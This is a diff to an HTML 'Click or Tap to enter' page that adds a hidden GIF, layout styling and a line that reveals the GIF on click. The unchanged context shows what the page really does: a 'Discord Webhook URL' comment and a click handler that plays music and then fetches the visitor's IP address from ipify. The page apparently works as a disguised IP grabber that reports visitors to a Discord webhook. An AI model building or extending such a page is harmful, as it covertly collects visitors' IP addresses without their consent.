@@ -6,6 +6,7 @@
     body {
       font-family: Arial, sans-serif;
       display: flex;
+      flex-direction: column; /* Stack elements vertically */
       justify-content: center;
       align-items: center;
       height: 100vh; /* Full viewport height */
@@ -16,12 +17,21 @@
     #info {
       font-size: 18px;
       text-align: center;
+      margin-top: 20px;
+    }
+    #gif {
+      display: none; /* Hide GIF by default */
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
   <h1 id="click-to-enter">Click or Tap to enter...</h1>
   <div id="info"></div>
+  
+  <!-- Hidden image that will be shown on click -->
+  <img id="gif" src="https://media.tenor.com/images/b7c33f80d67f4cc99e2a896a4b5e2573/tenor.gif" alt="GIF">
+
   <audio id="music" src="https://raw.githubusercontent.com/CosmoGT-dev/CosmoGT-Website/main/Me%20right%20now.mp3" preload="auto"></audio>
   <script>
     // Discord Webhook URL
@@ -35,6 +45,9 @@
 
       // Play music
       document.getElementById('music').play();
+
+      // Show the GIF
+      document.getElementById('gif').style.display = 'block';
 
       // Get user's IP address using IPify API
       fetch('https://api.ipify.org?format=json')
